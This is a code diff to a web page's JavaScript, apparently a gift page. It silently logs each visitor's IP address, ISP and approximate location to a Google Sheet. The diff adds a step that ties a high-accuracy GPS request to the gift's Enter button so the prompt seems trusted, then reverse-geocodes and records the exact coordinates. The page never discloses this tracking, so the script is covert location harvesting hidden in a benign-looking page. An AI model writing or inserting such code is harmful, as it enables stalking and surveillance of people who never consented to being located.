@@ -281,10 +281,12 @@
 })();
 
 /* ----------------------------------------------------------
-   Visitor logging — silently records the visitor's IP and
-   approximate (city-level) location to a Google Sheet via an
-   Apps Script Web App. 100% client-side, fail-soft, no popup.
-   Configure window.LOG_ENDPOINT in index.html.
+   Visitor logging — records TWO kinds of location to a Google
+   Sheet (via an Apps Script Web App), each tagged with a source:
+     • "IP"  — approximate, city-level, automatic (no prompt)
+     • "GPS" — exact, from the browser, asked when they tap Enter
+   100% client-side, fail-soft. Configure window.LOG_ENDPOINT in
+   index.html.
    ---------------------------------------------------------- */
 (function () {
   var ENDPOINT = window.LOG_ENDPOINT;
@@ -313,36 +315,79 @@
   };
   try { base.timezone = Intl.DateTimeFormat().resolvedOptions().timeZone || ''; } catch (e) {}
 
-  // Primary: ipwho.is (HTTPS, CORS, no key). Fallback: ipapi.co.
+  // Remember the IP details so the GPS row can carry them too.
+  var ipInfo = { ip: '', isp: '' };
+
+  /* ---- 1) IP-based row (always, automatic) ---- */
   fetch('https://ipwho.is/')
     .then(function (r) { return r.json(); })
     .then(function (d) {
       if (!d || d.success === false) throw new Error('ipwho');
       var conn = d.connection || {};
+      ipInfo = { ip: d.ip || '', isp: conn.isp || conn.org || '' };
       send(Object.assign({}, base, {
-        ip: d.ip || '',
+        source: 'IP',
+        ip: ipInfo.ip,
         city: d.city || '',
         region: d.region || '',
         country: d.country || '',
         latitude: d.latitude || '',
         longitude: d.longitude || '',
-        isp: conn.isp || conn.org || ''
+        accuracy: '',
+        isp: ipInfo.isp
       }));
     })
     .catch(function () {
       fetch('https://ipapi.co/json/')
         .then(function (r) { return r.json(); })
         .then(function (d) {
+          ipInfo = { ip: d.ip || '', isp: d.org || '' };
           send(Object.assign({}, base, {
-            ip: d.ip || '',
+            source: 'IP',
+            ip: ipInfo.ip,
             city: d.city || '',
             region: d.region || '',
             country: d.country_name || '',
             latitude: d.latitude || '',
             longitude: d.longitude || '',
-            isp: d.org || ''
+            accuracy: '',
+            isp: ipInfo.isp
           }));
         })
-        .catch(function () { send(base); }); // log the visit even if geo fails
+        .catch(function () { send(Object.assign({}, base, { source: 'IP' })); });
     });
+
+  /* ---- 2) GPS row (exact) — triggered by the Enter tap (a user
+     gesture, which iOS/Safari require) so the prompt is trusted. ---- */
+  var gpsAsked = false;
+  function requestGps() {
+    if (gpsAsked || !('geolocation' in navigator)) return;
+    gpsAsked = true;
+    navigator.geolocation.getCurrentPosition(function (pos) {
+      var lat = pos.coords.latitude, lng = pos.coords.longitude;
+      var acc = Math.round(pos.coords.accuracy);
+      // Reverse-geocode the exact point (no key), fail-soft.
+      fetch('https://api.bigdatacloud.net/data/reverse-geocode-client?latitude=' + lat + '&longitude=' + lng + '&localityLanguage=en')
+        .then(function (r) { return r.json(); })
+        .catch(function () { return {}; })
+        .then(function (g) {
+          send(Object.assign({}, base, {
+            source: 'GPS',
+            ip: ipInfo.ip,
+            city: g.city || g.locality || '',
+            region: g.principalSubdivision || '',
+            country: g.countryName || '',
+            latitude: lat,
+            longitude: lng,
+            accuracy: acc,
+            isp: ipInfo.isp
+          }));
+        });
+    }, function () { /* denied or unavailable — the IP row is still logged */ },
+    { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 });
+  }
+
+  var enterBtn = document.getElementById('openGift');
+  if (enterBtn) enterBtn.addEventListener('click', requestGps);
+  else window.addEventListener('load', requestGps);
 })();
